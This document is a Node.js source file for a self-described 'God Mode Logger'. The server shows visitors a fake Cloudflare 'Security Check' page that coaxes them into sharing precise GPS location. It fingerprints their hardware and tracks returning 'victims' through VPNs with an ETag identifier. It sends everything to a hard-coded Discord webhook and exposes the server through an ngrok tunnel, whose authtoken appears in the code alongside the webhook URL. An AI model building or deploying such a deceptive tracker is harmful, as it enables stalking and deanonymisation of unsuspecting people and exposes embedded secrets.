const express = require('express');
const axios = require('axios');
const requestIp = require('request-ip');
const maxmind = require('@maxmind/geoip2-node');
const path = require('path');
const cookieParser = require('cookie-parser');
const bodyParser = require('body-parser');
const { v4: uuidv4 } = require('uuid');

const app = express();
app.use(cookieParser());
app.use(bodyParser.json());
app.set('trust proxy', true);

// ==========================================
// 💀 GOD MODE CONFIGURATION
// ==========================================
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1459597365689323726/rQNK5AWMghoMELAQyZO-SZRm7UxSR5ar1ZceQpCWgzPv-F79jDuAIgkczwT6wkXi_sl_';
const REDIRECT_URL = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
const DB_FILENAME = 'GeoLite2-City.mmdb';

// Load Database
let dbLookup = null;
const dbPath = path.join(__dirname, DB_FILENAME);
maxmind.Reader.open(dbPath).then(reader => {
    dbLookup = reader;
    console.log("✅ Forensic Database Loaded.");
}).catch(() => console.log("⚠️ Database missing."));

// Database of "Infected" Users (Memory Storage)
const victimDatabase = {};

// ==========================================
// 🕸️ THE TRAP (Frontend + ETag)
// ==========================================
app.get('/', (req, res) => {

    // --- 1. ZOMBIE CHECK (ETag) ---
    // Check if they are a returning victim hiding behind a VPN
    let victimID = req.headers['if-none-match'];
    let isReturning = false;

    if (victimID && victimDatabase[victimID]) {
        isReturning = true;
    } else {
        victimID = uuidv4(); // Assign new Infection ID
    }

    // Save/Update their status in memory
    // We don't log to Discord yet; we wait for them to click the button
    // so we can get the GPS data too.
    victimDatabase[victimID] = {
        original_ip: isReturning ? victimDatabase[victimID].original_ip : requestIp.getClientIp(req),
        latest_ip: requestIp.getClientIp(req),
        is_returning: isReturning
    };

    // Set the ETag (The "Infection")
    res.set('ETag', victimID);

    // --- 2. THE VISUAL TRAP (HTML) ---
    // This sends the "Security Check" page to get GPS
    const html = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Cloudflare Security</title>
        <style>
            body { background: #1a1a1a; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
            .box { background: #2d2d2d; padding: 30px; border-radius: 10px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); text-align: center; max-width: 400px; }
            h2 { margin-top: 0; color: #e0e0e0; }
            p { color: #aaa; font-size: 14px; margin-bottom: 25px; }
            .btn { background: #4a90e2; color: white; border: none; padding: 12px 30px; border-radius: 5px; cursor: pointer; font-size: 16px; transition: 0.3s; }
            .btn:hover { background: #357abd; }
            .shield { font-size: 50px; margin-bottom: 20px; display: block; }
        </style>
    </head>
    <body>
        <div class="box">
            <span class="shield">🛡️</span>
            <h2>Security Check</h2>
            <p>Please allow location verification to prove you are connecting from a secure region.</p>
            <button class="btn" onclick="breakIn()">Verify Connection</button>
        </div>

        <script>
            function breakIn() {
                // Try to get GPS
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(sendData, sendData, { enableHighAccuracy: true });
                } else {
                    sendData({});
                }
            }

            function sendData(position) {
                const data = {
                    // GPS (If they allowed it)
                    lat: position.coords ? position.coords.latitude : null,
                    lon: position.coords ? position.coords.longitude : null,
                    acc: position.coords ? position.coords.accuracy : null,
                    
                    // Hardware Fingerprint
                    screen: screen.width + "x" + screen.height,
                    cores: navigator.hardwareConcurrency || "Unknown",
                    ram: navigator.deviceMemory || "Unknown",
                    gpu: getGPU(),

                    // Platform
                    platform: navigator.platform,
                    
                    // The Zombie ID we injected earlier
                    victimID: "${victimID}" 
                };

                fetch('/collect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                }).then(() => {
                    window.location.href = "${REDIRECT_URL}";
                });
            }

            function getGPU() {
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl');
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                } catch(e) { return "Unknown"; }
            }
        </script>
    </body>
    </html>
    `;
    res.send(html);
});

// ==========================================
// 📡 THE COLLECTOR (Backend)
// ==========================================
app.post('/collect', (req, res) => {
    const data = req.body;
    const clientIp = requestIp.getClientIp(req);
    const userAgent = req.get('User-Agent');

    // --- BOT FILTER ---
    if (/bot|discord|google|crawler/i.test(userAgent)) return res.sendStatus(200);

    // Retrieve Zombie Data
    const zombie = victimDatabase[data.victimID] || {};
    const isVPN = zombie.is_returning && (zombie.original_ip !== clientIp);

    // Location Logic
    let loc = { city: "Unknown", country: "Unknown" };
    if (dbLookup) {
        try {
            const r = dbLookup.city(clientIp);
            if (r) { loc.city = r.city.names.en; loc.country = r.country.names.en; }
        } catch (e) { }
    }

    // Map Link
    let mapLink = "🚫 Denied";
    if (data.lat) mapLink = `[Open Google Maps](https://www.google.com/maps?q=${data.lat},${data.lon})`;

    // Construct Embed
    const embed = {
        username: "God Mode Logger",
        avatar_url: "https://i.imgur.com/4M34hi2.png",
        embeds: [{
            title: isVPN ? "🚨 VPN BYPASSED (Zombie Detected)" : "✨ NEW VICTIM CAPTURED",
            color: isVPN ? 0xFF0000 : 0x00FF00,
            description: `**ID:** \`${data.victimID}\`\n**IP:** \`${clientIp}\` ${isVPN ? `(Original: ${zombie.original_ip})` : ''}`,
            fields: [
                { name: "📍 GPS Location", value: mapLink, inline: true },
                { name: "🌍 Network Location", value: `${loc.city}, ${loc.country}`, inline: true },
                { name: "💻 Platform / OS", value: `\`${data.platform || 'Unknown'}\``, inline: true },
                { name: "📱 Hardware", value: `GPU: ${data.gpu}\nRAM: ${data.ram}GB | Cores: ${data.cores}`, inline: false }
            ],
            footer: { text: "Forensic Tracking System" },
            timestamp: new Date().toISOString()
        }]
    };

    axios.post(DISCORD_WEBHOOK_URL, embed).catch(console.error);
    res.sendStatus(200);
});

// ==========================================
// 🏁 START SERVER & TUNNEL
// ==========================================
const { spawn } = require('child_process');

const PORT = 3000;
app.listen(PORT, async () => {
    console.log(`\n🟢 Local Engine Running:  http://localhost:${PORT}`);
    console.log(`⌛ Initializing Ngrok Tunnel (Direct Mode)...`);

    // Clean up any old processes first
    try { require('child_process').execSync('taskkill /F /IM ngrok.exe', { stdio: 'ignore' }); } catch (e) { }

    // Start ngrok directly
    // Command: ngrok http 3000 --authtoken=XXX --log=stdout
    const ngrokProcess = spawn('ngrok.exe', [
        'http',
        PORT.toString(),
        '--authtoken=384jyF85TZS8gMaK9CAPZ2DYIaF_3aUxYUqYGuqoQnoaaqeEV',
        '--log=stdout'
    ], {
        cwd: __dirname // Ensure we run from the folder containing ngrok.exe
    });

    let urlFound = false;

    // Capture Output
    ngrokProcess.stdout.on('data', (data) => {
        const output = data.toString();
        // console.log("Debug Ngrok:", output); // Uncomment if needed

        // Look for URL in logs
        const match = output.match(/url=(https:\/\/[^ ]+)/);
        if (match && !urlFound) {
            urlFound = true;
            const url = match[1];
            console.log(`\n🎉 -----------------------------------------`);
            console.log(`🚀 PUBLIC LINK: ${url}`);
            console.log(`🎉 -----------------------------------------\n`);
            console.log(`Waiting for victims...`);
        }
    });

    ngrokProcess.stderr.on('data', (data) => {
        console.error(`Ngrok Error: ${data}`);
    });

    ngrokProcess.on('close', (code) => {
        console.log(`Ngrok process exited with code ${code}`);
    });

    // Cleanup when node dies
    let cleanupDone = false;
    const cleanup = () => {
        if (cleanupDone) return;
        cleanupDone = true;
        ngrokProcess.kill();
        try { require('child_process').execSync('taskkill /F /IM ngrok.exe', { stdio: 'ignore' }); } catch (e) { }
        process.exit(0); // <--- IMPORTANT: Actually exit the process!
    };

    process.on('SIGINT', cleanup);
    process.on('SIGTERM', cleanup);
    process.on('exit', cleanup);
});